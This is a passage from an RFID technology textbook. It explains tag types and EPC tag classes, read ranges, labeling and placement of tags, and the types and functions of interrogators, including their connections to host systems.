usually operate at 455 MHz, 2.45 GHz, or 5.8 GHz, typically have a read range of 20 meters 
to 100 meters.
Note that the read range performance improves with the increase in the frequency. 
However, for a given frequency, the read range also depends on other factors, such as the 
maximum power the antenna is allowed to transmit, the communication technique being 
used, and the tag type.
CAUTION
For a given frequency, tag type, and communication technique, the practical 
read distance of a tag also depends on other factors such as the regulated 
maximum radiated power and antenna size.

RFID systems operating in the LF and HF ranges typically use the same frequencies all 
over the world, as shown in Table 3.1, but there is no global agreement on which frequencies 
should be used for RFID systems operating in the UHF range. As shown in Table 3.2, different 
UFH frequency bands are allocated to the RFID systems in different regions of the world.

 
Working with RFID Tags • Chapter 3

This section mentioned active tags and passive tags. What are they? Let’s take a look.
Understanding Tag Types
The two major characteristics that determine the performance and use of a tag are the tag type and 
the frequency at which the tag operates. The tag types are determined by the following two factors:
■ 
Can the tag initiate the communication?
■ 
Does the tag have its own power source?
Based on different combinations of answers to these two questions, there are three types 
of tags: passive, semipassive, and active.
Passive Tags
A passive tag is a tag that does not have its own power source, such as a battery, and therefore 
cannot initiate the communication. It responds to the signal sent by the reader by taking 
power from the reader’s signal. In other words, the reader’s signal wakes up the passive tag. 
Here is how it works:
1. The passive tag’s antenna (or coil) receives the signal from the reader.
2. The antenna sends the signal to the IC.
3. Part of the signal power is used to power up the IC.
4. The IC powers up, processes the incoming signal, and sends the response.
The characteristics of a passive tag include the following:
■ 
Placement Because a passive tag entirely depends on the reader for its power, it 
must be inside the interrogation zone to get enough power to generate a response.

Chapter 3 • Working with RFID Tags
■ 
Size and range Because there is no battery, passive tags tend to be smaller in size 
and have a shorter read range compared to active tags.
■ 
Lifespan Because there is no need to replace a battery, passive tags have a longer 
life.
■ 
Memory The memory capacity of passive tags varies from 1 bit to several 
kilobytes.
Remember the following about passive tags:
■ 
Passive tags can operate at any of these frequency ranges: LF, HF, and UHF.
■ 
Depending on the frequency range at which a passive tag is operating, a passive tag 
may have a read range from 2 millimeters to about 5 meters.
■ 
The passive tags are simpler and cheaper and therefore more popular.
■ 
LF passive tags are ideal for applications that require reading from a close range.
So, the deﬁ ning characteristic of a passive tag is that it does not initiate communication. 
If a tag does have a battery but does not initiate communication, it is still a passive tag, but 
it’s called a semipassive tag.
Semipassive Tags
A semipassive tag is a tag that has its own power source such as a battery but does not initiate 
communication. It responds to the signal sent by the reader by taking power from the 
reader’s signal. In other words, the reader’s signal wakes up the passive tag. A passive tag uses 
its battery to run its circuitry. The characteristics of a semipassive tag include the following:
■ 
Operation Because a semipassive tag can transmit a response signal only if it gets 
adequate power from the reader, its operating principle is very similar to that of a 
passive tag.
■ 
Size and range Because a semipassive tag has its own battery, it is larger than the 
passive tag. For the same reason, it can produce a stronger signal, which can transmit 
across a longer distance, resulting in a larger read range compared to a passive tag.
■ 
Lifespan A semipassive tag has a shorter life (tied to battery) than a passive tag.
■ 
Memory The memory capacity of a semipassive tag varies and can be greater than 
that of a passive tag, partly due to its larger size (more room for components) and battery.
In a nutshell, a semipassive tag uses a battery to run the circuitry but still does not initiate 
communication because it still uses the power from the incoming signal to prepare the response.
So, on one end of the spectrum is the passive tag that contains no battery and cannot 
initiate communication. In the middle is the semipassive tag that has a battery but does not 

 
Working with RFID Tags • Chapter 3 
59
initiate communication. On the other end of the spectrum is the tag type that contains the 
battery and can initiate communication; this tag is called an active tag.
Active Tags
An active tag is a tag that has its own power source such as a battery and can initiate 
communication by sending its own signal. It does not rely on the power from the reader 
to run its circuitry or to create the signal. It does not need a wakeup call from the reader. 
The characteristics of an active tag include the following:
■ 
Operation Because an active tags has its own power source, it has the choice 
of staying up all the time or waking up when a signal is received. A tag that is 
operating all the time can broadcast its location at predetermined intervals.
■ 
Size Because of their power sources (batteries), active tags are the largest in 
size. Typical sizes are (1.5 × 3) × 0.5 inch3. However, with the advancement of 
technology, the smallest active tags could be the size of a coin.
■ 
Read range Because an active tag has its own power source for circuitry and for 
generating signals, it can achieve the greatest read range. Some active tags have the 
ability to send a signal across a distance of 1 km. However, conﬁ ned to standards 
and regulations, many active tags have read ranges of tens of meters. Due to its 
larger read range, an active tag can be integrated with a global positioning system 
(GPS) to pinpoint the exact location of an object.
■ 
Lifespan Finite but long enough battery lifetime. It can be as long as 10 years.
■ 
Memory The memory capacity of passive tags varies and can be greater than 
that of passive and semipassive tags, partly due their larger size (more room for 
components) and batteries.
Active tags can be used to track high-value assets such as rail cars and cargo containers 
that need to be read from large distances. Because active tags have the ability to initiate 
communication, they can be further divided into two subtypes:
■ 
Active transponders These tags are activated only when they receive a signal 
from a reader. This way the tags prolong their battery life. These tags can be used in 
applications such as toll collection systems and checkpoint control systems.
■ 
Beacons A beacon is a tag that emits a signal at predetermined intervals. Beacons 
are mostly used in real-time locating systems (RTLS). Possible applications for 
beacons include the following:
■ Tracking parts in large manufacturing facilities
■ Marine and aircraft rescue operations

Chapter 3 • Working with RFID Tags
NOTE
Active tags usually operate in the UHF and microwave frequency ranges 
(455 MHz, 2.45 GHz, and 5.8 GHz) and have read ranges from 20 to 100 meters.

Working with RFID Tags • Chapter 3 
61
So, the tag types categorize the tags from the communication perspective—that is, 
whether a tag can initiate communication and whether the tag has its own power to generate 
the  communication signal. As tag technology progresses, other ways of categorizing tag types 
are developing. One of them is categorization by class, which is largely based on memory 
design.
Tag Classiﬁ cation
As you know by now, tags are data holders that are attached or afﬁ xed to an object and carry 
that object’s data, including its identiﬁ cation number. These numbers are also called electronic 
product codes (EPCs), and the tags containing them are called EPC tags. The complexity of an 
EPC tag varies depending on its functionality—how it communicates and whether or not it 
has a power source of its own.
NOTE
Passive tags are simple and less expensive. UHF provides the greater read 
range. To get the best of the both worlds, companies are increasingly 
becoming interested in using UHF passive tags, especially in the supply chain. 
For example, consider a warehouse in which a reader must be able to read a 
tag from about 3 meters distance. The LF and HF tags would need to be read 
from much closer distances; therefore, the reader begins to interfere with the 
normal operation of equipment such as forklifts.
NOTE
The EPC is a group of coding schemes for tags deﬁ ned by the standard 
called Generation 2. These coding schemes are designed to meet the wide 
spectrum of needs of various industries while guaranteeing uniqueness of 
codes for all tags that comply with the standard. The EPC was originally 
the creation of the Massachusetts Institute of Technology (MIT) Auto-ID 
Center, a consortium of over 120 corporations and university research labs.
The increased functionality and therefore complexity of tags results in increased cost 
because tags with advanced functions require more expensive microchips and their own 

62 
Chapter 3 • Working with RFID Tags
power source. Although most business sectors require only the simplest and therefore 
lowest-cost tags, the potential value of complex tags justiﬁ es their increased cost in certain 
industries. For example, think of the food industry, which might want to add temperature 
tracking by adding a temperature sensor on tags attached to food items in containers. To 
accommodate varying levels of complexity, MIT’s Auto-ID Center proposed six tag classes, 
presented in Figure 3.2. As illustrated in the ﬁ gure, each class is a subset of the functionality 
contained within the higher class.
These tag classes are discussed in the following sections.
Class 0 Tags
A class 0 tag is a simple, passive, and read-only tag that is programmed with a unique EPC 
number during manufacturing. These tags cannot be programmed by users in the ﬁ eld. 
Being UFS based and low cost, these tags are suitable for applications that need to detect 
only the tag’s presence and not any other data, such as antitheft devices. A class 0 tag must 
have the following elements:
■ 
The tag identiﬁ er (TID) This is assigned by the manufacturer to uniquely 
identify the product.

■ 
EPC number This number is assigned by the manufacturer to identify the 
speciﬁ c object to which the tag is attached. This is also called an object ID (OID).
■ 
A kill function This can be used to disable the tag permanently.
Class 0+ tags are essentially the same as class 0 tags, with only one difference: You can 
write to class 0+ in the ﬁ eld, but only once. Both class 0 and class 0+ tags are passive 
tags—that is, they do not have a power source of their own, and as a result they can only be 
woken up by a signal from the reader.
Class 1 Tags
A class 1 tag is a simple, passive, read and write-once, backscatter tag. It has a one-time, 
ﬁ eld-programmable, nonvolatile memory. The tag is manufactured with no data written 
into the memory. However, because it’s a write once/read-only memory (WORM) tag, the 
data can be written (once) either by the manufacturer before shipping or by the user in the 
ﬁ eld. The tags in this class have the following characteristics:
■ 
Passive Cannot initiate communication and do not have their own power 
source.
■ 
Memory Have 128-bit memory: 96 bits for storing identiﬁ cation and 32 bits 
for error correction and kill function.
■ 
Write-once, read-only memory (WORM) Can be programmed by the 
manufacturer or by the user in the ﬁ eld, but only once.
Class 2 Tags
A class 2 tag is also a passive backscatter tag like class 0 and class 1 tags, but it’s very ﬂ exible 
when it comes to memory. It has the following characteristics:
■ 
Passive Cannot initiate communication and does not have its own 
power source.
■ 
Memory Up to 65 KB of read/write memory.
■ 
Authenticated access control
Class 2 tags are typically used to log data and therefore contain more memory than just 
what’s needed to store identiﬁ cation. Class 1 and 2 tags have become popular among the 
majority of RFID applications. However, for certain applications with diverse requirements, 
you need class 3 tags.

Chapter 3 • Working with RFID Tags
Class 3 Tags
A class 3 tag is a semipassive backscatter tag that has onboard sensors. It has the following 
characteristics:
■ 
Semipassive Cannot initiate communication but has its own power source to 
generate signals. Remains passive until activated by a reader signal.
■ 
Memory Up to 65 KB of read/write memory.
■ 
Integrated sensor circuitry
A class 3 tag with a built-in battery supports increased read range. The built-in memory 
also supports sensor recording parameters such as temperature, pressure, and motion into 
the memory without the power from the reader’s signal. These tags can be used in supply 
chain applications such as on pallets and containers, to provide historical information.
Class 0, 1, and 2 tags are passive tags, whereas class 3 tags are semipassive. That means 
none of these tags can initiate communication, and they all take power from the reader’s 
signal to generate a response signal. The needs of some applications may require the tag to 
use its own power source to generate signals and to be able to initiate communication. 
These requirements are met by class 4 and 5 tags.
Class 4 Tags
A class 4 tag is an active tag with integrated transmitter. It uses a built-in battery to run 
the microchip’s circuitry and to power the transmitter to broadcast the signal to a reader. 
It has the following characteristics:
■ 
Active It can initiate communication because it has its own power source to run 
the circuitry and to generate the signal.
■ 
Memory Rewritable.
■ 
Communication Ability to communicate with other tags.
■ 
Networking Ad hoc networking capabilities.
The class 4 tags can be used in applications such as parents keeping track of their children 
in an amusement park, a tag inside a cargo container passing information from other tags to 
an external reader (networking), and tags working with GPSs to track objects globally.
Class 5 Tags
A class 5 tag is an active RFID tag that has the capability of communicating with other class 
5 tags and other devices. Its capabilities include all the capabilities of a class 4 tag. The only 
additional functionality that a class 5 tag has over a class 4 tag is its ability to initiate 
communication with all classes of tags. That means it can initiate communication with a

passive tag as well by waking up the tag. Due to this reader functionality, a class 5 tag is also 
called a reader tag.
All these classes of tags are summarized in Table 3.4.

Chapter 3 • Working with RFID Tags
So, tags are classiﬁ ed to be manufactured with varied levels of features, capabilities, and 
resulting complexity. As Table 3.4 depicts, each higher-class tag offers all the features and 
capabilities of the lower-class tags and more.
A common core functionality of all kinds of tag is that they can be read by readers. The 
maximum distance from which a tag can be read is called its read range. We need to take a 
close look at tags’ read ranges.
Read Ranges of Tags
The need for read range of a tag generally corresponds to the application requirement. In 
other words, the read range of a tag plays an important role in determining which application 
will use this tag. For example, in a warehouse, a reader must be able to read tags from a 
distance of a few meters, say about 3 meters, at least. Otherwise, it will start interfering with 
the normal operation of equipment such as forklifts.
From the physics perspective, where does the read range come from? As shown in 
Figure 3.3, it is mainly determined by the following four characteristics:
■ 
Operating frequency
■ 
The maximum allowed power emission
■ 
Tag type: active or passive
■ 
Communication technique: inductive coupling or backscattering

You have already seen in this chapter how the read range depends on the tag type and 
the operating frequency. The maximum allowed power that an antenna can emit comes from 
standards and regulations. The higher the power, the larger the read range. The read range 
also depends on which of the following two communication techniques your RFID system 
is using:
■ 
Inductive coupling You learned about inductive coupling in Chapter 2. The 
reader and the tag use coils as antennas. These coils create magnetic ﬁ elds. The 
variations in the magnetic ﬁ eld are used to transfer power (and data) between the 
reader and the tag. In technical terms, the energy is transferred between two 
circuits (tag and reader) by virtue of the mutual inductance between the circuits. 
This technique limits the read range because it only works in the near ﬁ eld of the 
coils. Therefore, inductive coupling requires that the reader be close to the tag. This 
leads to a read range of about 30 cm for LF tags to 1 meter for HF tags.
■ 
Backscattering Also called backscatter coupling, this concept was also discussed 
in Chapter 2. Backscattering is typically used by UHF passive tags. Because back-
scattering works beyond the near ﬁ eld, it allows larger read ranges. For example, 
the read range of a UHF passive tag using backscattering can be larger than 3 
meters.
So far, we have discussed tags from the perspectives of the functionality and the features 
offered by them. But before you can use these tags, they need to be changed to some kind 
of labels and placed on the items that that need to be identiﬁ ed and tracked.
Labeling and Placing a Tag
Tags are placed on the items that need to be identiﬁ ed and tracked. Before you can place a 
tag, that is, attach a tag to an item, it needs to be in a form so that it can be conveniently 
attached to the item. Creating that form is called labeling the tag. In other words, to tag an 
item is a three-step process:
■ 
Manufacture the tag (a combination of IC, antenna, and substrate).
■ 
Label the tag—that is, convert the tag into some kind of label.
■ 
Place the label on the item that needs to be tracked.
Labeling a Tag
The basic functionality of all tags is the same, and therefore the basic components are also 
the same: chip, antenna, and substrate. However, a tag needs to be converted into a form in 

68 
Chapter 3 • Working with RFID Tags
which it can be conveniently attached to an item. What form (e.g., size and shape) a tag will 
take depends on the following factors:
■ 
The characteristics, such as the material of the item to which the tag is to be 
attached
■ 
The environment around the item
Therefore, labeling a tag depends on its application, such as where and how it will be 
placed. Accordingly, tags are manufactured and turned into usable forms in various shapes 
and sizes. In other words, RFID tags are available in various media conﬁ gurations. Your 
selection depends on the application requirements. This has given rise to different kinds of 
tags and terms that you should be aware of. Some of them are discussed in the following 
sections.
Inlay
The inlay is the bare-bones tag discussed in this chapter so far—that is, the combination of 
antenna, chip, and substrate. The inlay needs to be packaged (labeled) before use.
Insert
An insert is an inlay inserted between a label in the front and an adhesive layer in the back. 
The adhesive in the back can be permanently mounted, for example, on the inner wall of a 
tire. RFID inserts are available in different sizes depending on the applications in which they 
will be used. Here are some examples:
■ 
Thick inserts intended to be used in harsh environments
■ 
Paper-thin inserts in a pressure-sensitive environment, used, for example, to track 
parcels
■ 
Postage stamp-sized inserts applied to videocassettes
Smart Labels
A smart label is a barcode label that has an embedded RFID tag inside it. You can print 
human-readable, useful information on the label face, such as sender’s address, destination 
address, and product information. A smart label has the following components:
■ 
Inlay IC, antenna, and substrate
■ 
Label face stock Covers the top of the inlay and provides area for printing 
human-readable information.

 
Working with RFID Tags • Chapter 3 
69
■ 
Adhesive Used to attach the face stock to the inlay.
■ 
Release liner Covers the bottom of the inlay. This layer can be used to convert 
the pressure-sensitive inlay into rolls for easy and safe distribution. This layer can 
later be removed to place the smart label on an item.
Smart labels are designed to withstand a number of hazards such as extreme temperature, 
chemicals, moisture, and exposure to ultraviolet radiation.
Pressure-Sensitive Labels
Pressure-sensitive labels are used in RFID-enabled media and are basically the same as smart 
labels. A tag can also be inserted into an envelope, which can be attached to the face stock 
and coated with an adhesive for placement.
RFID-Enabled Tickets
RFID-enabled tickets are inserted into paper or plastic envelopes that are directly attached to the 
items that need to be identiﬁ ed. The paper or plastic material used for these envelopes should 
be ultraviolet-resistant—that is, transparent to UHF waves. Several types of polypropylene, 
polyester, polyethylene, and polyethylene terephthalate (PET) ﬁ lms are good selections and 
offer low attenuation for UHF waves.
Tie-On Tags
Tie-on tags are basically RFID-enabled tickets that are attached with a tie-on. These tags are 
usually used on nonconveyable items. However, you must consider that a tie-on made of a 
conductive wire may positively or negatively affect tag performance.
TIP
Avoid polyvinyl chloride (PVC) ﬁ lms with tags that use copper antennas 
because they run the risk of long-term antenna corrosion.
So, generally speaking, a label is any kind of tag attached to an item by an adhesive with the 
purpose of identifying the item. Labels come in many forms and can be differentiated by the 
type of base material, called stock, on which you can print, and by the adhesive type that they use.

70 
Chapter 3 • Working with RFID Tags
Selecting Adhesive Types for Tags
An adhesive, used to afﬁ x a tag to the surface of the item that needs to be identiﬁ ed, is a 
strong chemical mixture. It may affect the tag’s performance in various ways. For example, 
it might absorb RF waves and can corrode the antennas in the long run. Furthermore, some 
adhesives may deteriorate over time, even if they are perfectly ﬁ ne at the time of their initial 
application. There are two basic types of adhesive:
■ 
Acrylic adhesives Offer best high-temperature performance and the widest 
spectrum of properties.
■ 
Rubber-based adhesives Offer high initial tack, good for applications such as 
tagging corrugated cases; relatively lower in cost.
The effectiveness of a tag adhesive depends on the following:
■ 
Ease and strength of initial tack
■ 
Time it takes the bond to form the full strength
■ 
The ﬁ nal bond strength
■ 
Long-term bond stability and resistance to deterioration over time
■ 
Stability in a hostile environment
After a tag has been labeled, it can be placed on the item that needs to be identiﬁ ed and 
tracked.
Placing a Tag
Placing tags on the items can be challenging. There are no global guidelines regarding where 
on the items the tags should be placed. It depends on the application, item, and environment. 
On the other hand, you have only so much freedom in where you can place the tag on an 
item. Most of the time, the tag is placed on the outside of a package. In this case, you should 
be aware of how the package material can affect the RF signal. The material of the package 
or in the vicinity of the package can affect the RF signal between the tag and the reader in 
the ways shown in Table 3.5.

The performance of an RFID system also depends on how the tagged items are packed 
together, for example, on a pallet. Following are some considerations.
Shadowing
Shadowing is caused when an item, say B, is behind another item, say A, from the perspective 
of the reader. In this case, a signal from the reader will be received only by A. The item B 
will get little or no signal and will be missed by the reader. Item B, in this situation, is said to 
be shadowed by item A. If the items inside a package or the cases on a pallet are densely 
packed, the reader will miss some of them.
NOTE
Corrugated means rippled at regular intervals. Usually shipping boxes are 
made with several layers of cardboard, and in the middle is a layer of 
corrugated paper or cardboard. This layer in the middle gives the box more 
cushion to withstand the hard knocks of shipping and handling.
NOTE
A pallet is a portable platform for stowing, handling, and moving cargo.

72 
Chapter 3 • Working with RFID Tags
Tag Placement and Orientation
The orientation of a tag with respect to the reader is an important factor that impacts 
reading performance of an RFID system. For example, if a tag is oriented parallel to the 
direction of propagation of energy coming from the reader, it will not receive its signal, and 
no communication will occur. To facilitate communication, the tag antenna must face the 
reader antenna. For example, consider the following scenario.
Reader antennas are often mounted on gantries placed around a conveyor. The 
tagged packages (containers) are often cubic in shape, and therefore they have six faces 
to be considered for placing tags. In general, the bottom face should be avoided, to 
prevent mechanical damage to the tag. The top face should be avoided if there is a 
possibility that the packages will be stacked. Reader antennas on each side of the gantry 
will cover four faces of the container. The exact positions of the tag and the reader and 
the antenna orientations should be determined to ensure that the tag will be in the read 
zone of at least one reader. A single reader antenna may not see all the faces of the 
container, especially if the container contains RF-sensitive materials such as metals or 
liquids.
To improve performance, you can position antennas at different angles to read tags that 
would otherwise be missed.
The orientation of a tag also depends on the polarization of the reader’s antenna.
Polarization and Orientation
As you learned in Chapter 2, antennas are either linearly polarized or circularly polarized. 
For optimal power transfer between the reader antenna and the tag antenna, the polarization 
of both antennas should match. The orientation of a tag’s antenna should be consistent with 
the polarization of the reader’s antenna. Here are some examples:
■ 
In the case of a single dipole antenna, the antenna must be aligned parallel to the 
incoming ﬁ eld to receive it.
■ 
If reader’s antenna is producing horizontally polarized waves, the tag’s antenna must 
be horizontally aligned.
■ 
If the reader’s antenna is circularly polarized, the tag will get some signal in any 
orientation because circularly polarized waves have both components, horizontal 
and vertical. In other words, circularly polarized reader antennas improve read 
performance.

 
Working with RFID Tags • Chapter 3 
73
Our tag placement discussion so far mostly applies to readers and tags with antennas. 
How about the RFID system that uses inductive coupling for communication?
Orientation in Inductive Coupling
Readers and antennas that use the inductive coupling communication technique use 
inductive coils instead of antennas. These systems are relatively less sensitive to orientation. 
However, you should know that to transfer the maximum power, the two coils should be in 
the same plane. If one of them is rotated with respect to the other, the coupling (and 
therefore the power transfer) reduces in proportion to the cosine of the angle of rotation.
The three most important takeaways from this chapter are the following:
■ 
The basic functionality of any tag is to store information about the item to which it 
is attached and to provide this information when requested by a reader. To support 
this functionality, all tags have three basic components: a chip, an antenna, and a 
substrate.
■ 
There are two basic types of tags: active tags that can initiate communication and 
passive tags that cannot initiate communication.
■ 
The principal consideration for placing a tag on an item is that it should be 
readable by a reader. A tag is useless if it cannot be read.
TIP
When you do not know the tag orientation or you have no control over it, 
you should use the circularly polarized reader antenna because it can read 
horizontal tags, vertical tags, and tags aligned to angles between horizontal 
and vertical.

74 
Chapter 3 • Working with RFID Tags
Summary
A tag is a component of an RFID system that contains the information about the item to 
which it is attached; the tag is capable of providing this information when requested. So, a 
tag’s functionality is to store the information about the item to which it is afﬁ xed, to receive 
and process the request for this information, and to send a response to this request that 
carries the information about the item. To support this functionality, a tag has a chip and an 
antenna housed on a substrate.
To meet a wide spectrum of application requirements, tags come in different kinds. Based 
on how they communicate, tags are of two types: active tags that can initiate communication 
and passive tags that cannot initiate communication. Based on the features they offer, the tags 
are classiﬁ ed into six classes: class 0, class 1, class 2, class 3, class 4, and class 5. Class 0, 1, and 2 
tags are passive tags, whereas class 3 tags are semipassive. Class 4 and 5 tags are active tags. 
Class 0 tags are read-only; class 0+, 1, and 2 tags are write-once, read-only; and class 3, 4, and 
5 tags are readable and writable.
Before the tags can be placed on items, they are turned into various kinds of labels, 
depending on the varied needs of applications. This gives rise to a different way of categorizing 
tags. Some examples of these forms of tags are smart labels, inserts, RFID-enabled tickets, and 
tie-on tags. The main goal in placing a tag on an item is that it should be readable by a reader. 
A reader can only read a tag in a limited area around it, called an interrogation zone, discussed in 
the next chapter.

Chapter 4 • Working with Interrogation Zones
Introduction
An RFID system is based on communication between an interrogator and a tag. The tag is 
attached to an item that needs to be identiﬁ ed and tracked, and it contains the information 
about the item such as its identiﬁ cation. The interrogator’s job is to collect that information 
from the tag and send the information to a host computer, where it could be used. For an 
interrogator to be able to communicate with a tag, the tag must be within a certain area around 
the interrogator, called the interrogation zone. Multiple interrogators and tags can create a crowded 
environment called a dense environment in which things (interrogator zones and signals) can run 
into each other. Therefore, you need to conﬁ gure the interrogation zone in an optimal way.
So, the central issue in this chapter is the interrogation zone. To be able to put your arms 
around this issue, you will explore three avenues: functionality of an interrogator, dense 
environments, and conﬁ guring and optimizing interrogation zones.
Understanding an Interrogator
An interrogator is the RFID component that collects information from tags and sends it to a 
host system. The process of collecting the information from the tags is called reading the tags, 
and for this reason an interrogator is also called a reader.
As you know from Chapter 1, the goal of an RFID system is to identify and track items, 
which is accomplished by tagging the items with tags and collecting the information about the 
items from the tags. As Figure 4.1 depicts, an interrogator is at the center of this action. From 
the perspective of an interrogator, the information collection process is performed as follows:
1. The interrogator gets a request for information from the host system.
2. The interrogator sends the request for information to a tag within its interrogation zone.
3. The tag responds with the requested information.
4. The interrogator sends the collected information to the host system.
Now that you can appreciate the signiﬁ cance of the role that an interrogator plays in an 
RFID system, you can ask the following three questions to learn more about it:

1. What is an interrogator made of?
2. What is the functionality of an interrogator?
3. How does an interrogator communicate?
What an Interrogator Is Made Of
An interrogator is composed of the following components:
■ 
A RF module, also called a transceiver, which modulates outgoing RF signals and 
demodulates incoming RF signals
■ 
A signal processing and control unit
■ 
A coupling element that communicates with the tags via RF signals; this is 
essentially an antenna
■ 
An interface to communicate with the host system: to receive a request for 
information and to send back the requested information
With these basic components, interrogators come in various types.
Interrogator Types
Interrogators come in various types to meet varied application requirements. All these types 
are categorized into the following two classes:
■ 
Read-only Reading information stored (programmed) in the tag is what an 
interrogator is basically made for. All those interrogators that can only read the 
information from the tag and cannot write the information to the tag are called 
read-only interrogators.
■ 
Read and write Interrogators that can write information into a tag in addition 
to reading the information from the tag are called read and write interrogators.
CAUTION
Not all interrogators have the write capability. For information to be written 
to a tag, the interrogator should have the capability to write and the tag 
should allow the writing.
Both read-only and read/write interrogators come in various types, described in the 
following sections.

80 
Chapter 4 • Working with Interrogation Zones
Fixed-Mount Interrogators
Fixed-mount interrogators are ﬁ xed-position interrogators mounted at speciﬁ c locations though 
which the tagged items are expected to pass. Conveyors, dock doors, and retail store 
checkout points are some examples of such locations. Any tagged item that passes through 
the interrogation zone (the area around the interrogator) is scanned—that is, the interrogator 
reads the information from the tag attached to the item. The advantage of a ﬁ xed-mount 
interrogator is that the tags are read (in other words, the items are scanned) automatically. 
The disadvantage of a ﬁ xed-mounted interrogator is the possibly harsh environment that 
comes with the location where the interrogator is mounted. Because the reading is automated 
and because the interrogator is ﬁ xed, environmental conditions such as temperature, moisture, 
vibrations, and materials such as metals can pose challenges. You must take note of these 
conditions while mounting an interrogator—for example, position an antenna away from 
metals.
NOTE
Water and material with water content can absorb energy from RF signals 
and thereby weaken them, and metals can reﬂ ect RF signals and thereby 
change their directions. Both of these factors (weakening the signal and 
changing the signal direction) decrease an interrogator’s efﬁ ciency in reading 
tags.
You might think that you can largely avoid harsh environmental conditions and gain 
more ﬂ exibility if you could get a mobile interrogator. Such devices are available; let’s take 
a look.
Handheld Interrogators
Handheld interrogators are mobile (portable) interrogators, and therefore they contain all the 
basic elements, including antenna and application software, in one device. The information 
collected from the tags is stored in the interrogator and later transferred to a data processing 
system, if the application requires it.
Handheld interrogators offer maximum ﬂ exibility. A user can bring the interrogator close 
to the tagged item and collect the information. So, these interrogators are designed with 
near-ﬁ eld read/write capabilities. In other words, a handheld interrogator’s read range (the 
maximum distance from which an interrogator can read a tag) is less than that of a mounted 
interrogator. Handheld interrogators can be used for applications such as tracking and 
scanning items in medical, ofﬁ ce, and retail environments.

 
Working with Interrogation Zones • Chapter 4 
81
NOTE
A handheld interrogator typically supports only one antenna.
Now you get more ambitious and ask the question: Why can’t I get the best of both 
worlds—a mounted interrogator that can be moved? Well, they are available too: they’re 
called vehicle-mount interrogators.
Vehicle-Mount Interrogators
Vehicle-mount interrogators are mobile mount interrogators that can be mounted on a 
vehicle such as a forklift. Because it’s mobile, you can cover a lot more area with a 
vehicle-mount interrogator than a ﬁ xed-mount interrogator. In addition, its read range 
is larger than that of a handheld interrogator. Because it’s inside a vehicle, you can easily 
add a printer and other peripherals to the system and communicate with the host 
system wirelessly, for example, using wireless networks based on the 802.11 protocol. 
A disadvantage of the vehicle-mount interrogator is that it might have to work in the 
vicinity of metallic materials. This could pose a challenge because metals can reﬂ ect 
the RF signal.
As you can see, the components and types of interrogator are there to serve its 
functionality, which we explore next.
What an Interrogator Is Good For
Interrogators come with various functions and capabilities that can vary depending on 
the application for which the interrogators are designed. The functions and capabilities 
interrogators offer fall into three main categories: communication with the host computer, 
communication with tags, and operational capabilities.
Communication With the Host Computer
Depending on the application, the data the interrogator collects from the tags may be used 
by some application such as inventory control. In such cases, the interrogator needs to 
send the collected data to a host computer to which it is connected. The connection may 
be a serial connection or a network connection. In a serial connection, the interrogator is 
connected to the host computer just like a peripheral is locally connected to a computer. 
In a network connection, the reader is connected to a network to which the host computer 
is also connected. The network connection may be through a cable or it could be wireless, 
as in the case of a handheld reader.

Encoding and decoding information The interrogator communicates 
with the tag wirelessly by sending and receiving RF waves. It codes the data 
(information) into an RF carrier signal and transmits this signal into the free 
space. This signal is to be received by a tag in the interrogator zone. It also 
receives the response signal from the tags and decodes the information from it. 
The frequency used for this communication between the interrogator and the 
tag, called operating frequency, varies depending on the applications, standards, 
and regulations.
■ 
Powering the passive tags Tags that do not have their own power source 
(battery) are called passive tags. They get power from the signal they receive from 
the interrogator and use that power for their operation (i.e., to power up their 
circuitry) and for composing the response signal that they send back.
■ 
Reading and writing the tags Reading the tag—that is, getting the information 
from the tag about the tagged item—is the minimum functionality of an interrogator. 
Some interrogators also have the capability of writing information to the tag. However, 
this can happen only if the tag allows it. That is, the tag must be a read/write tag—
that is, a writable tag. Writable tags can allow an interrogator to write new data, 
modify existing data, or delete the data altogether.
Operational Capabilities
Operational capabilities enable the interrogator to integrate into the RFID system and offer 
some features. Interrogators can offer three main operational capabilities:
■ 
Firmware upgrade Firmware is a software program embedded in a device that 
conﬁ gures its basic functionality when the device is powered up. It consists of 
software instructions stored in nonvolatile memory—the memory that survives even 
if the device is powered off. This memory is basically a chip called a read-only memory 
(ROM) chip. In the earlier days of personal computing, if you needed to change the 
instructions on a ROM chip, you would need a new chip because you could not 
write to it, hence the name read-only. However, these days most ﬁ rmware chips are 
upgradeable—that is, you can change the instructions on the chip. They can still be 
called ROM chips for historical reasons. However, the memory on such chips is still 
nonvolatile, but the content can be upgraded. If the interrogator has upgradeable 
ﬁ rmware, it can be upgraded to, for example, new functionalities and new standards 
and protocols. This capability is important, given that RFID technology and standards 
are continually evolving.

■ 
Graphical user interface (GUI) Graphical user interfaces offer a convenient 
way to interact with a device—for example, to tell it to do something and then 
receive the results (output) of its work. For instance, an open window on your 
computer is part of the GUI that allows you to interact with the computer. Various 
interrogators offer various GUI options, depending on the applications. For example, 
some interrogators offer an HTTP GUI, which means that you can interact with 
the interrogator through the World Wide Web using your Web browser; others offer 
only a local GUI. Either way, you can conﬁ gure and manage the interrogators using 
the GUIs they offer.
■ 
I/O capability You might need to control (or use) the interrogator from 
another device, or you might need your interrogator to control (or use) another 
device. In both cases you will need to connect the other device to the interrogator 
through a port. These ports are called input/output (I/O) ports and the devices are 
I/O devices. An example of an input device is a device called an electronic eye, which 
turns on the reader when it senses that an object has entered the interrogation 
zone. An example of an output device is a light stack that signals when a tag has 
been read.
NOTE
The underlying functionality of I/O capability is that an event can enable the 
interrogator to do something (input), and the interrogator can create an 
event in response to the information received from a tag (output).
You will learn more about the communication between an interrogator and a tag 
throughout the book. An interrogator also communicates with the host computer.
Communicating With the Host
In an RFID system, an interrogator collects information from tags and sends it to the host 
computer, where it can be used by an application such as inventory system. To be able to 
send the information to the host computer, the interrogator must be connected to it. The 
connection could be a serial connection through a serial port or a network connection 
through a network card (interface) such as Ethernet.
Serial Connections
A serial connection consists of a serial port on the reader, a serial port on the host computer, 
and a cable directly connecting the two serial ports. The data travels though the cable as a 

84 
Chapter 4 • Working with Interrogation Zones
stream of bits, one bit at a time, sequentially. The standard protocol used for serial communi-
cation in most readers is RS-232, the same protocol that is typically used to send data from 
your keyboard (as you type) to your computer. Serial connections have the following 
advantages:
■ 
Low cost
■ 
A reliable and locally managed communication link
However, serial connections also have the following disadvantages:
■ 
The ﬂ exibility about the location of the host computer relative to the reader is 
limited by the cable length.
■ 
Depending on the locations of the readers and the serial ports available 
on the host computers, you will need multiple host computers for multiple 
readers.
■ 
If the readers in your RFID system have no network connections, you will need to 
be physically there to manage them.
Depending on the size of your RFID system, the serial connections can result in higher 
cost and signiﬁ cant system downtime. The solution to this problem is replacing the serial 
